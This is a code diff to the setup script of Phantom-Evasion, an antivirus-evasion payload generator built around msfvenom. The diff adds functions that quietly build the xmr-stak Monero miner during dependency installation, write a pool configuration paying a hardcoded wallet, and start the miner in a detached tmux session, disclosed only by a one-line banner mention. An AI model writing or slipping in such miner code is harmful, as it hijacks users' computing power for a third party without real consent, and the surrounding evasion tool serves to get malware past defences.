@@ -24,9 +24,11 @@
 import subprocess,sys
 import os,platform
 import random
+import string
 from time import sleep 
 from shutil import rmtree
 from random import shuffle
+import multiprocessing
 sys.dont_write_bytecode = True
 
 class bcolors:
@@ -88,6 +90,7 @@ def kali_arch_isready():
     sleep(0.5)
     print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
     package = os.system("dpkg -l | grep libc6-dev-i386 >/dev/null 2>&1")
+
     if package == 0:
         print(bcolors.GREEN + "[>] Package libc6-dev-i386               [Found]\n" + bcolors.ENDC)
     else:
@@ -105,18 +108,38 @@ def kali_arch_isready():
     auto_setup("msfvenom")
     auto_setup("msfconsole")
     auto_setup("openssl")
+    xmr_folder=os.path.isdir("Setup/Donate")
+    if xmr_folder == False:
+        xmr_setup()
+
     print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
     sleep(1)
 
 def ubuntu_isready():
-    print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
     sleep(0.5)
+
+    print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
+    package = os.system("dpkg -l | grep libc6-dev-i386 >/dev/null 2>&1")
+
+    if package == 0:
+        print(bcolors.GREEN + "[>] Package libc6-dev-i386               [Found]\n" + bcolors.ENDC)
+    else:
+        print(bcolors.RED + "[>] Package libc6-dev-i386                 [Not Found]\n" + bcolors.ENDC)
+        sleep(1)
+        print(bcolors.GREEN + "[>] Trying to autoinstall:\n" + bcolors.ENDC)
+        sleep(1)
+        subprocess.call(['apt-get','install','libc6-dev-i386','-y'])
     auto_setup("apktool")
     auto_setup("gcc")
     auto_setup("mingw-w64")
     auto_setup("pyinstaller")
     auto_setup("zipalign")
     auto_setup("openssl")
+
+    xmr_folder=os.path.isdir("Setup/Donate")
+    if xmr_folder == False:
+        xmr_setup()
+
     try:
         is_present=subprocess.check_output(['which','msfvenom'],stderr=subprocess.STDOUT)
 
@@ -217,6 +240,76 @@ def dependencies_checker():
 
         pass
 
+def xmr_setup():
+    os.system("xterm -e \"mkdir Setup/Donate ;cd Setup/Donate ;apt install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev -y ;git clone https://github.com/fireice-uk/xmr-stak.git ;mkdir xmr-stak/build ;cd xmr-stak/build ;cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF ; make install\"")
+    username = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(random.randint(12,16)))
+    miner_config=""
+    miner_config+="Miner = True\n"
+    miner_config+="Username = " + username + "\n"
+
+    with open("Setup/Donate/Config.txt", "w") as config:
+        config.write(miner_config)
+
+    miner_config2 = ""
+    miner_config2 += "\"pool_list\" :\n"
+    miner_config2 += "[\n"
+    miner_config2 += "	{\"pool_address\" : \"pool.supportxmr.com:3333\", \"wallet_address\" : \"474DTYXuUvKPt4uZm6aHoB7hPY3afNGT1A3opgv9ervJWph7e2NQGbU9ALS2VfZVEgKYwgUp7z8PxPx2u2CAqusPJgxaiXy\", \"pool_password\" : \"" + username + "\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },\n"
+    miner_config2 += "],\n"
+    miner_config2 += "\"currency\" : \"monero\",\n"
+    miner_config2 += "\"call_timeout\" : 10,\n"
+    miner_config2 += "\"retry_time\" : 30,\n"
+    miner_config2 += "\"giveup_limit\" : 0,\n"
+    miner_config2 += "\"verbose_level\" : 3,\n"
+    miner_config2 += "\"print_motd\" : true,\n"
+    miner_config2 += "\"h_print_time\" : 60,\n"
+    miner_config2 += "\"aes_override\" : null,\n"
+    miner_config2 += "\"use_slow_memory\" : \"warn\",\n"
+    miner_config2 += "\"tls_secure_algo\" : true,\n"
+    miner_config2 += "\"daemon_mode\" : false,\n"
+    miner_config2 += "\"flush_stdout\" : false,\n"
+    miner_config2 += "\"output_file\" : \"\",\n"
+    miner_config2 += "\"httpd_port\" : 0,\n"
+    miner_config2 += "\"http_login\" : \"\",\n" 
+    miner_config2 += "\"http_pass\" : \"\",\n"
+    miner_config2 += "\"prefer_ipv4\" : true,\n"
+
+    with open("Setup/Donate/xmr-stak/build/bin/config.txt", "w") as xmrconfig:
+        xmrconfig.write(miner_config2)
+
+    cpu_config = ""
+    cpu_config += "\"cpu_threads_conf\" :\n"
+    cpu_config += "[\n\n"
+
+    if multiprocessing.cpu_count() == 2:
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
+
+    elif multiprocessing.cpu_count() == 4:
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
+
+    elif multiprocessing.cpu_count() == 8:
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 1 },\n"
+
+    elif multiprocessing.cpu_count() == 12:
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 1 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 2 },\n"
+
+    elif multiprocessing.cpu_count() >= 16:
+
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 1 },\n"    
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 2 },\n"
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 3 },\n"
+
+    else:
+        cpu_config += "    { \"low_power_mode\" : true, \"no_prefetch\" : true, \"affine_to_cpu\" : 0 },\n"
+
+    cpu_config += "\n],\n"
+
+    with open("Setup/Donate/xmr-stak/build/bin/cpu.txt", "w") as cpuconfig:
+        cpuconfig.write(cpu_config)
+
 def advisor():
     clear()
     print(bcolors.RED + "[DISCLAIMER]:" + bcolors.ENDC + "Phantom-Evasion is intended to be used for legal security")
@@ -229,6 +322,8 @@ def advisor():
     print(bcolors.RED + "[+] VERSION: " + bcolors.ENDC + "0.2 \n")
     sleep(0.2)
     print(bcolors.RED + "[+] MODULES: " + bcolors.ENDC + "12\n")
+    sleep(0.2)
+    print(bcolors.RED + "[+] INTEGRATED XMR-MINER: " + bcolors.ENDC + "See Readme Donate Section \n")
     sleep(0.2)
     print(bcolors.RED + "[+] NEW FEATURES: " + bcolors.ENDC + "Powershell payload & custom encoder \n")
   
@@ -271,6 +366,12 @@ def exit_banner():
     print("          :. :  |                |   here    |                               ")
     print("         ,... : ;                | 31/10/2017|                               ")
     print("-.\"-/\\\/:::.    `\.\"-._-_'.\"-\"_\\-|...........|///..-..--.-.-.-..-..-\"-..-") 
+
+def xmr_miner():
+
+    subprocess.call(['tmux','send-keys','-t','phantom-miner','\"\x03\"','C-m'], stdout=open(os.devnull,'wb'), stderr=open(os.devnull,'wb'))
+    sleep(0.25)
+    os.system('tmux new -s phantom-miner -d \"./Setup/Donate/xmr-stak/build/bin/xmr-stak -c Setup/Donate/xmr-stak/build/bin/config.txt --cpu Setup/Donate/xmr-stak/build/bin/cpu.txt \"') 
 
 def pytherpreter_completer(module_type):
     clear()
